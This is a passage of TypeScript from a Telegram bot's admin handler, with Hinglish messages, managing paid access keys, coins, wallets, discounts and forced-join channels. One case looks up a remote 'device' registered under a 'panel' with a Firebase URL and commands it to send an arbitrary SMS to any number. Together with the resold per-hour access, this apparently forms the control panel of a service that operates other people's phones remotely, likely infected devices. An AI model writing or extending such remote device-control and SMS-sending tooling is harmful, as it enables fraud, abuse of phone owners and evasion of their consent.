      await setSetting("refer_extra_options", values.join(","));
      await b.sendMessage(chatId, `✅ Extra per-referral random minutes: ${values.join(", ")}`, {
        reply_markup: { inline_keyboard: [[{ text: "🔙 Settings", callback_data: "adm_settings" }]] },
      });
      break;
    }

    case "send_sms_to": {
      pendingInputs.set(chatId, { type: "send_sms_msg", data: { ...pending.data, toNumber: text } });
      await b.sendMessage(chatId, "💬 SMS message bhejo:");
      break;
    }
    case "send_sms_msg": {
      const deviceDbId = pending.data?.deviceDbId as number;
      const toNumber = pending.data?.toNumber as string;
      const listPage = Number(pending.data?.listPage ?? 0);
      const [device] = await db.select().from(devicesTable).where(eq(devicesTable.id, deviceDbId));
      if (!device) { await b.sendMessage(chatId, "❌ Device not found."); return; }
      const [panel] = await db.select().from(panelsTable).where(eq(panelsTable.id, device.panelId));
      if (!panel?.firebaseUrl) { await b.sendMessage(chatId, "❌ No Firebase URL."); return; }
      const { sendSmsViaFirebase } = await import("../firebase/send-sms.js");
      await sendSmsViaFirebase({ firebaseUrl: panel.firebaseUrl, panelName: panel.name, firebaseDeviceId: device.deviceId, toNumber, message: text });
      await b.sendMessage(chatId, `✅ SMS command sent to Firebase!\nTo: \`${toNumber}\`\nMsg: "${text}"\n\n_Success only after Firebase ACK._`,
        { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "🔙 Back", callback_data: `dev_${deviceDbId}_${listPage}` }]] } }
      );
      break;
    }

    case "force_ch_id": {
      const [existing] = await db.select().from(forceChannelsTable).where(eq(forceChannelsTable.channelId, text));
      if (existing) { await b.sendMessage(chatId, "❌ Channel already added."); return; }
      pendingInputs.set(chatId, { type: "force_ch_user", data: { channelId: text } });
      await b.sendMessage(chatId, "📝 Channel @username bhejo:");
      break;
    }
    case "force_ch_user": {
      const username = text.startsWith("@") ? text.slice(1) : text;
      await db.insert(forceChannelsTable).values({ channelId: pending.data?.channelId as string, channelUsername: username, label: username });
      await b.sendMessage(chatId, `✅ Force channel added: @${username}`, { reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Menu", callback_data: "adm_menu" }]] } });
      break;
    }

    case "reset_user_id": {
      const [wallet, ua, coins] = await Promise.all([getBalance(text), getUserAccess(text), getCreditCoins(text)]);
      await b.sendMessage(chatId,
        `⚠️ *Confirm Reset for \`${text}\`*\n\n💰 Wallet: ₹${wallet}\n🪙 Coins: ${coins}\n🔑 Access: ${ua.hasAccess ? "Active till " + formatDate(ua.expiresAt) : "None"}\n\n_Yeh action sab kuch clear kar dega (wallet, access, coins, ban)._`,
        {
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [{ text: "✅ Confirm Reset", callback_data: `confirm_reset_${text}` }, { text: "❌ Cancel", callback_data: "adm_menu" }],
            ],
          },
        }
      );
      break;
    }

    case "key_pause_id": {
      const isPaused = (await getSetting(`access_paused_${text}`)) === "1";
      if (isPaused) {
        await setSetting(`access_paused_${text}`, "0");
        invalidateAccess(text);
        await b.sendMessage(chatId, `▶️ Access *resumed* for \`${text}\``, { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Menu", callback_data: "adm_menu" }]] } });
        b.sendMessage(text, "▶️ Your access has been resumed by admin. Use /start to continue.").catch(() => {});
      } else {
        await setSetting(`access_paused_${text}`, "1");
        invalidateAccess(text);
        await b.sendMessage(chatId, `⏸ Access *paused* for \`${text}\``, { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Menu", callback_data: "adm_menu" }]] } });
        b.sendMessage(text, "⏸ Your access has been temporarily paused by admin.").catch(() => {});
      }
      break;
    }

    case "credit_expiry_id": {
      const curCoins = await getCreditCoins(text);
      await setCreditCoins(text, 0);
      await b.sendMessage(chatId, `✅ Credit coins expired for \`${text}\` (was ${curCoins} coins).`, { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Menu", callback_data: "adm_menu" }]] } });
      b.sendMessage(text, "🗑 Your credit coins have been manually expired by admin.").catch(() => {});
      break;
    }

    case "key_extend_id":
      pendingInputs.set(chatId, { type: "key_extend_hours", data: { userId: text } });
      await b.sendMessage(chatId, `➕ \`${text}\` ki key kitne ghante extend karni hai?`);
      break;
    case "key_extend_hours": {
      const hours = parseInt(text);
      if (isNaN(hours) || hours <= 0) { await b.sendMessage(chatId, "❌ Invalid hours."); return; }
      const userId = pending.data?.userId as string;
      const expiresAt = await grantAccessForHours(userId, hours);
      await b.sendMessage(chatId, `✅ ${hours}h extended for \`${userId}\`\nNew expiry: ${formatDate(expiresAt)}`, { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Menu", callback_data: "adm_menu" }]] } });
      b.sendMessage(userId, `🎁 *Admin ne ${hours}h extend kiya!*\nNew expiry: ${formatDate(expiresAt)}`, { parse_mode: "Markdown" }).catch(() => {});
      break;
    }

    case "key_reduce_id":
      pendingInputs.set(chatId, { type: "key_reduce_hours", data: { userId: text } });
      await b.sendMessage(chatId, `➖ \`${text}\` ki key kitne ghante reduce karni hai?`);
      break;
    case "key_reduce_hours": {
      const hours = parseInt(text);
      if (isNaN(hours) || hours <= 0) { await b.sendMessage(chatId, "❌ Invalid hours."); return; }
      const userId = pending.data?.userId as string;
      const [ua2] = await db.select().from(userAccessTable).where(eq(userAccessTable.chatId, userId));
      if (!ua2 || ua2.expiresAt <= new Date()) { await b.sendMessage(chatId, "❌ User ka koi active access nahi."); return; }
      const newExpiry = new Date(ua2.expiresAt.getTime() - hours * 60 * 60 * 1000);
      await db.update(userAccessTable).set({ expiresAt: newExpiry }).where(eq(userAccessTable.chatId, userId));
      invalidateAccess(userId);
      await b.sendMessage(chatId, `✅ ${hours}h reduced for \`${userId}\`\nNew expiry: ${formatDate(newExpiry)}`, { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Menu", callback_data: "adm_menu" }]] } });
      break;
    }

    case "set_key_disc": {
      const pct = parseInt(text);
      if (isNaN(pct) || pct < 0 || pct > 100) { await b.sendMessage(chatId, "❌ 0–100 ke beech value bhejo."); return; }
      await setSetting("key_discount_pct", String(pct));
      await b.sendMessage(chatId, `✅ Key plan discount: *${pct}%*`, { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "🔙 Discounts", callback_data: "adm_discount" }]] } });
      break;
    }

    case "set_coin_disc": {
      const pct = parseInt(text);
      if (isNaN(pct) || pct < 0 || pct > 100) { await b.sendMessage(chatId, "❌ 0–100 ke beech value bhejo."); return; }
      await setSetting("coin_discount_pct", String(pct));
      await b.sendMessage(chatId, `✅ Coin plan discount: *${pct}%*`, { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "🔙 Discounts", callback_data: "adm_discount" }]] } });
      break;
    }

    default: await b.sendMessage(chatId, "❌ Unknown input.");
  }
}
